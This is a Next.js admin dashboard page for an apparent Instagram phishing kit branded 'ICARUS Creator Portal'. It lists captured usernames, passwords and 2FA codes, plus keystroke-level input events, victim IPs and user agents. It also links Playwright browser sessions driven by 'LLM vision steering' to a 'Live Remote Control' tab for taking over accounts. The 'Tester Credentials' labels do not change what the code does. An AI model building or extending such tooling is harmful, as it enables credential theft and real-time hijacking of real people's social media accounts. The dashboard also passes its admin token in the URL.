import { getStorage, type TrackingEvent } from "@/lib/storage";
import { activeSessionPool } from "@/lib/session-pool";
import { getLogs } from "@/lib/dev-log";

interface AdminPageProps {
  searchParams: Promise<{ token?: string; tab?: string; sessionId?: string }>;
}

export const dynamic = "force-dynamic";

export default async function AdminPage({ searchParams }: AdminPageProps) {
  const { token, tab = "overview", sessionId } = await searchParams;
  const adminToken = process.env.ADMIN_TOKEN;

  if (!adminToken || token !== adminToken) {
    return (
      <html lang="en">
        <head>
          <title>ICARUS Admin — Login</title>
          <style>{styles}</style>
        </head>
        <body className="login">
          <div className="login-box">
            <h1>ICARUS Creator Portal</h1>
            <p>Admin Dashboard</p>
            <form method="GET" action="/admin">
              <input type="password" name="token" placeholder="Enter admin password" autoFocus />
              <button type="submit">Sign in</button>
            </form>
          </div>
        </body>
      </html>
    );
  }

  const storage = await getStorage();
  const events = await storage.list(1000);

  const pageViews = events.filter((e) => e.event === "page_view");
  const clicks = events.filter((e) => e.event === "connect_instagram_click");
  const credentialEvents = events.filter(
    (e) =>
      e.event === "modal_login_click" ||
      e.event === "input_username" ||
      e.event === "input_password" ||
      Boolean(e.metadata?.username || e.metadata?.password || e.metadata?.value)
  );
  const uniqueIps = new Set(events.map((e) => e.ip));

  const activeSessions = await activeSessionPool.getAllSessions();

  const logs = getLogs(150).filter((l) => !sessionId || l.sessionId === sessionId);

  const tabs = [
    { id: "overview", label: "Overview", count: events.length },
    { id: "observability", label: "Observability", count: logs.length },
    { id: "credentials", label: "Tester Credentials", count: credentialEvents.length },
    { id: "control", label: "Live Remote Control", count: activeSessions.length },
    { id: "page_views", label: "Page Views", count: pageViews.length },
    { id: "clicks", label: "Connect Clicks", count: clicks.length },
    { id: "ips", label: "Unique IPs", count: uniqueIps.size },
    { id: "raw", label: "Raw Events", count: events.length },
  ];

  return (
    <html lang="en">
      <head>
        <title>ICARUS Admin Dashboard</title>
        <style>{styles}</style>
      </head>
      <body>
        <div className="layout">
          <aside className="sidebar">
            <div className="brand">
              <h2>ICARUS</h2>
              <span>Creator Analytics</span>
            </div>
            <nav>
              {tabs.map((t) => (
                <a
                  key={t.id}
                  href={`/admin?token=${encodeURIComponent(token)}&tab=${t.id}`}
                  className={`nav-item ${tab === t.id ? "active" : ""}`}
                >
                  <span>{t.label}</span>
                  <span className="badge">{t.count}</span>
                </a>
              ))}
            </nav>
          </aside>

          <main className="main">
            <header className="topbar">
              <h1>{tabs.find((t) => t.id === tab)?.label}</h1>
              <div className="stats-row">
                <StatCard label="Total Events" value={events.length} />
                <StatCard label="Captured Credentials" value={credentialEvents.length} />
                <StatCard label="Page Views" value={pageViews.length} />
                <StatCard label="Connect Clicks" value={clicks.length} />
                <StatCard label="Unique IPs" value={uniqueIps.size} />
              </div>
            </header>

            <section className="content">
              {tab === "overview" && (
                <OverviewTab
                  events={events}
                  pageViews={pageViews}
                  clicks={clicks}
                  credentialEvents={credentialEvents}
                />
              )}
              {tab === "observability" && (
                <ObservabilityTab token={token} logs={logs} sessions={activeSessions} />
              )}
              {tab === "credentials" && (
                <CredentialsTable events={credentialEvents} title="Tester Captured Credentials & Box Entries" />
              )}
              {tab === "control" && <ControlTab token={token} sessions={activeSessions} />}
              {tab === "page_views" && <EventsTable events={pageViews} title="Page Views" />}
              {tab === "clicks" && <EventsTable events={clicks} title="Connect Instagram Clicks" />}
              {tab === "ips" && <IpTable events={events} />}
              {tab === "raw" && <EventsTable events={events} title="All Raw Events" />}
            </section>
          </main>
        </div>
      </body>
    </html>
  );
}

function StatCard({ label, value }: { label: string; value: number | string }) {
  return (
    <div className="stat-card">
      <div className="stat-value">{value}</div>
      <div className="stat-label">{label}</div>
    </div>
  );
}

function OverviewTab({
  events,
  pageViews,
  clicks,
  credentialEvents,
}: {
  events: TrackingEvent[];
  pageViews: TrackingEvent[];
  clicks: TrackingEvent[];
  credentialEvents: TrackingEvent[];
}) {
  const latest = events.slice(0, 10);
  const latestCreds = credentialEvents.slice(0, 5);

  return (
    <>
      {latestCreds.length > 0 && (
        <div style={{ marginBottom: "32px" }}>
          <h2>Latest Captured Credentials / Box Entries</h2>
          <CredentialsTable events={latestCreds} title="" />
        </div>
      )}
      <h2>Latest Activity</h2>
      <EventsTable events={latest} title="" />
      <div className="two-col">
        <div className="panel">
          <h3>Top Locations (Click)</h3>
          <LocationBreakdown events={clicks} />
        </div>
        <div className="panel">
          <h3>Events Over Time</h3>
          <p className="muted">{events.length} events recorded so far.</p>
        </div>
      </div>
    </>
  );
}

function CredentialsTable({ events, title }: { events: TrackingEvent[]; title: string }) {
  return (
    <>
      {title && <h2>{title}</h2>}
      <div className="table-wrap">
        <table>
          <thead>
            <tr>
              <th>Time</th>
              <th>Event</th>
              <th>Username / Field Input</th>
              <th>Password</th>
              <th>2FA Code</th>
              <th>Virtual Session Status</th>
              <th>Virtual Tab Screenshot</th>
              <th>IP</th>
              <th>User Agent</th>
            </tr>
          </thead>
          <tbody>
            {events.length === 0 ? (
              <tr>
                <td colSpan={9} style={{ textTransform: "none", textAlign: "center", padding: "24px", color: "var(--muted)" }}>
                  No box entries or credentials captured yet.
                </td>
              </tr>
            ) : (
              events.map((e) => {
                const username =
                  (e.metadata?.username as string) ||
                  (e.event === "input_username" ? (e.metadata?.value as string) : "—");
                const password =
                  (e.metadata?.password as string) ||
                  (e.event === "input_password" ? (e.metadata?.value as string) : "—");
                const twoFactorCode =
                  (e.metadata?.twoFactorCode as string) ||
                  (e.event === "input_2fa" ? (e.metadata?.value as string) : "—");

                const status = (e.metadata?.status as string) || (e.event === "virtual_login_attempt" ? "attempted" : "captured");
                const message = (e.metadata?.message as string) || "";
                const screenshot = e.metadata?.screenshotBase64 as string | undefined;

                return (
                  <tr key={e.id}>
                    <td>{e.timestamp ? new Date(e.timestamp).toLocaleString() : "—"}</td>
                    <td>
                      <span className={`tag ${e.event}`}>{e.event}</span>
                    </td>
                    <td className="cred-highlight">{username || "—"}</td>
                    <td className="cred-highlight-pass">{password || "—"}</td>
                    <td className="cred-highlight-2fa">{twoFactorCode || "—"}</td>
                    <td>
                      <span className={`tag status-${status}`}>{status}</span>
                      {message && <div style={{ fontSize: "11px", color: "var(--muted)", marginTop: "4px" }}>{message}</div>}
                    </td>
                    <td>
                      <div style={{ display: "flex", flexDirection: "column", gap: "4px" }}>
                        {screenshot ? (
                          <a href={screenshot} target="_blank" rel="noopener noreferrer" style={{ color: "var(--accent)", textDecoration: "underline", fontSize: "12px" }}>
                            View Snapshot
                          </a>
                        ) : (
                          <span style={{ color: "var(--muted)" }}>—</span>
                        )}
                        <a
                          href={`/admin?token=${encodeURIComponent(process.env.ADMIN_TOKEN || "")}&tab=control`}
                          style={{ color: "#22c55e", fontWeight: "600", fontSize: "12px", textDecoration: "none" }}
                        >
                          ⚡ Live Remote Control
                        </a>
                      </div>
                    </td>
                    <td className="mono">{e.ip}</td>
                    <td className="ua" title={e.userAgent}>
                      {e.userAgent}
                    </td>
                  </tr>
                );
              })
            )}
          </tbody>
        </table>
      </div>
    </>
  );
}

function ObservabilityTab({
  token,
  logs,
  sessions,
}: {
  token: string;
  logs: import("@/lib/dev-log").DevLogEntry[];
  sessions: import("@/lib/session-pool").ActiveSession[];
}) {
  return (
    <div>
      <h2>Login Flow & Playwright Observability Logs</h2>
      <p className="muted" style={{ marginBottom: "20px" }}>
        Real-time structured logs from virtual Instagram browser sessions and LLM vision steering ({logs.length} entries).
      </p>

      <div className="table-wrap">
        <table>
          <thead>
            <tr>
              <th>Timestamp</th>
              <th>Level</th>
              <th>Tag</th>
              <th>Message</th>
              <th>Session ID</th>
              <th>Data</th>
            </tr>
          </thead>
          <tbody>
            {logs.length === 0 ? (
              <tr>
                <td colSpan={6} style={{ textTransform: "none", textAlign: "center", padding: "24px", color: "var(--muted)" }}>
                  No observability logs recorded in buffer yet.
                </td>
              </tr>
            ) : (
              logs.map((log, idx) => {
                const dataStr = log.data ? JSON.stringify(log.data) : "";
                return (
                  <tr key={idx}>
                    <td>{new Date(log.ts).toLocaleString()}</td>
                    <td>
                      <span className={`tag status-${log.level === "error" ? "wrong_password" : log.level === "warn" ? "2fa_required" : "success"}`}>
                        {log.level}
                      </span>
                    </td>
                    <td className="mono">{log.tag}</td>
                    <td>{log.message}</td>
                    <td className="mono">{log.sessionId || "—"}</td>
                    <td className="url" title={dataStr}>
                      {dataStr || "—"}
                    </td>
                  </tr>
                );
              })
            )}
          </tbody>
        </table>
      </div>
    </div>
  );
}

import { ControlTabClient } from "./ControlTabClient";

function ControlTab({ token, sessions }: { token: string; sessions: import("@/lib/session-pool").ActiveSession[] }) {
  const initialSessions = sessions.map((s) => ({
    sessionId: s.sessionId,
    username: s.username,
    status: s.status,
    lastUpdated: s.lastUpdated,
    hasPage: Boolean(s.page),
    lastScreenshotBase64: s.lastScreenshotBase64,
  }));

  return <ControlTabClient token={token} initialSessions={initialSessions} />;
}

function EventsTable({ events, title }: { events: TrackingEvent[]; title: string }) {
  return (
    <>
      {title && <h2>{title}</h2>}
      <div className="table-wrap">
        <table>
          <thead>
            <tr>
              <th>Time</th>
              <th>Event</th>
              <th>IP</th>
              <th>Details / Metadata</th>
              <th>Location</th>
              <th>URL</th>
              <th>User Agent</th>
            </tr>
          </thead>
          <tbody>
            {events.map((e) => {
              const metaStr = e.metadata ? JSON.stringify(e.metadata) : "";
              return (
                <tr key={e.id}>
                  <td>{e.timestamp ? new Date(e.timestamp).toLocaleString() : "—"}</td>
                  <td>
                    <span className={`tag ${e.event}`}>{e.event}</span>
                  </td>
                  <td className="mono">{e.ip}</td>
                  <td className="url" title={metaStr}>
                    {metaStr || "—"}
                  </td>
                  <td>{(e.metadata?.location as string) || "—"}</td>
                  <td className="url">{e.url}</td>
                  <td className="ua" title={e.userAgent}>
                    {e.userAgent}
                  </td>
                </tr>
              );
            })}
          </tbody>
        </table>
      </div>
    </>
  );
}

function IpTable({ events }: { events: TrackingEvent[] }) {
  const byIp = new Map<string, { count: number; events: TrackingEvent[]; first: Date; last: Date }>();
  for (const e of events) {
    const existing = byIp.get(e.ip);
    const date = new Date(e.timestamp);
    if (existing) {
      existing.count++;
      existing.events.push(e);
      if (date < existing.first) existing.first = date;
      if (date > existing.last) existing.last = date;
    } else {
      byIp.set(e.ip, { count: 1, events: [e], first: date, last: date });
    }
  }

  const sorted = Array.from(byIp.entries()).sort((a, b) => b[1].count - a[1].count);

  return (
    <>
      <h2>Unique IPs</h2>
      <div className="table-wrap">
        <table>
          <thead>
            <tr>
              <th>IP</th>
              <th>Events</th>
              <th>First Seen</th>
              <th>Last Seen</th>
              <th>Latest UA</th>
            </tr>
          </thead>
          <tbody>
            {sorted.map(([ip, data]) => (
              <tr key={ip}>
                <td className="mono">{ip}</td>
                <td>{data.count}</td>
                <td>{data.first.toLocaleString()}</td>
                <td>{data.last.toLocaleString()}</td>
                <td className="ua" title={data.events[data.events.length - 1].userAgent}>
                  {data.events[data.events.length - 1].userAgent}
                </td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>
    </>
  );
}

function LocationBreakdown({ events }: { events: TrackingEvent[] }) {
  const counts = new Map<string, number>();
  for (const e of events) {
    const loc = (e.metadata?.location as string) || "unknown";
    counts.set(loc, (counts.get(loc) || 0) + 1);
  }
  const sorted = Array.from(counts.entries()).sort((a, b) => b[1] - a[1]);
  return (
    <ul className="simple-list">
      {sorted.map(([loc, count]) => (
        <li key={loc}>
          <span>{loc}</span>
          <span>{count}</span>
        </li>
      ))}
    </ul>
  );
}

const styles = `
  :root {
    --bg: #0f0f11;
    --panel: #18181b;
    --panel-hover: #232329;
    --border: #2a2a30;
    --text: #f3f1ec;
    --muted: #9ca3af;
    --accent: #af9164;
    --accent-2: #e1306c;
    --green: #22c55e;
  }
  * { box-sizing: border-box; }
  html, body { margin: 0; padding: 0; background: var(--bg); color: var(--text); font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
  body.login { display: flex; align-items: center; justify-content: center; min-height: 100vh; }
  .login-box { background: var(--panel); border: 1px solid var(--border); padding: 48px; width: 100%; max-width: 420px; text-align: center; }
  .login-box h1 { margin: 0 0 8px; font-family: "Bodoni Moda", Georgia, serif; letter-spacing: 0.05em; }
  .login-box p { color: var(--muted); margin: 0 0 24px; }
  .login-box input { width: 100%; padding: 14px; background: var(--bg); border: 1px solid var(--border); color: var(--text); font-size: 15px; margin-bottom: 16px; }
  .login-box button { width: 100%; padding: 14px; background: var(--accent); color: #121212; border: none; font-weight: 600; cursor: pointer; font-size: 14px; text-transform: uppercase; letter-spacing: 0.1em; }
  .login-box button:hover { opacity: 0.9; }

  .layout { display: flex; min-height: 100vh; }
  .sidebar { width: 260px; background: var(--panel); border-right: 1px solid var(--border); display: flex; flex-direction: column; }
  .brand { padding: 28px 24px; border-bottom: 1px solid var(--border); }
  .brand h2 { margin: 0; font-family: "Bodoni Moda", Georgia, serif; letter-spacing: 0.08em; }
  .brand span { color: var(--muted); font-size: 12px; text-transform: uppercase; letter-spacing: 0.1em; }
  .nav-item { display: flex; align-items: center; justify-content: space-between; padding: 16px 24px; color: var(--text); text-decoration: none; border-bottom: 1px solid var(--border); transition: background 0.15s; }
  .nav-item:hover { background: var(--panel-hover); }
  .nav-item.active { background: var(--panel-hover); border-left: 3px solid var(--accent); }
  .badge { background: var(--border); color: var(--muted); font-size: 12px; padding: 3px 10px; border-radius: 999px; }

  .main { flex: 1; display: flex; flex-direction: column; min-width: 0; }
  .topbar { padding: 28px 32px; border-bottom: 1px solid var(--border); }
  .topbar h1 { margin: 0 0 20px; font-family: "Bodoni Moda", Georgia, serif; font-weight: 400; }
  .stats-row { display: grid; grid-template-columns: repeat(auto-fit, minmax(160px, 1fr)); gap: 16px; }
  .stat-card { background: var(--panel); border: 1px solid var(--border); padding: 20px; }
  .stat-value { font-size: 32px; font-weight: 600; color: var(--text); }
  .stat-label { font-size: 12px; text-transform: uppercase; letter-spacing: 0.1em; color: var(--muted); margin-top: 6px; }

  .content { padding: 28px 32px; flex: 1; overflow: auto; }
  .content h2 { margin: 0 0 16px; font-weight: 500; }
  .content h3 { margin: 0 0 12px; font-weight: 500; color: var(--muted); }
  .table-wrap { overflow-x: auto; background: var(--panel); border: 1px solid var(--border); margin-bottom: 24px; }
  table { width: 100%; border-collapse: collapse; font-size: 13px; }
  th, td { padding: 14px 16px; text-align: left; border-bottom: 1px solid var(--border); }
  th { color: var(--muted); font-weight: 500; text-transform: uppercase; font-size: 11px; letter-spacing: 0.08em; background: var(--bg); }
  tr:hover td { background: var(--panel-hover); }
  .mono { font-family: ui-monospace, SFMono-Regular, Menlo, monospace; color: var(--muted); }
  .url { max-width: 240px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; color: var(--muted); }
  .ua { max-width: 280px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; color: var(--muted); }
  .tag { display: inline-block; padding: 4px 10px; font-size: 11px; text-transform: uppercase; letter-spacing: 0.08em; border: 1px solid var(--border); }
  .tag.page_view { color: var(--accent); border-color: var(--accent); }
  .tag.connect_instagram_click { color: var(--accent-2); border-color: var(--accent-2); }
  .tag.modal_login_click { color: var(--green); border-color: var(--green); }
  .tag.virtual_login_attempt { color: #a855f7; border-color: #a855f7; }
  .tag.virtual_2fa_submit { color: #ec4899; border-color: #ec4899; }
  .tag.input_username, .tag.input_password, .tag.input_2fa { color: #3b82f6; border-color: #3b82f6; }
  .tag.status-success { color: #22c55e; border-color: #22c55e; background: rgba(34, 197, 94, 0.1); }
  .tag.status-wrong_password { color: #f43f5e; border-color: #f43f5e; background: rgba(244, 63, 94, 0.1); }
  .tag.status-2fa_required { color: #eab308; border-color: #eab308; background: rgba(234, 179, 8, 0.1); }
  .tag.status-checkpoint { color: #f97316; border-color: #f97316; background: rgba(249, 115, 22, 0.1); }
  .tag.status-error { color: #9ca3af; border-color: #9ca3af; }
  .cred-highlight { font-family: ui-monospace, SFMono-Regular, Menlo, monospace; font-weight: 600; color: #60a5fa; }
  .cred-highlight-pass { font-family: ui-monospace, SFMono-Regular, Menlo, monospace; font-weight: 600; color: #f43f5e; }
  .cred-highlight-2fa { font-family: ui-monospace, SFMono-Regular, Menlo, monospace; font-weight: 600; color: #eab308; }
  .muted { color: var(--muted); }
  .two-col { display: grid; grid-template-columns: repeat(auto-fit, minmax(320px, 1fr)); gap: 24px; }
  .panel { background: var(--panel); border: 1px solid var(--border); padding: 24px; }
  .simple-list { list-style: none; margin: 0; padding: 0; }
  .simple-list li { display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid var(--border); }
  .simple-list li:last-child { border-bottom: none; }
`;
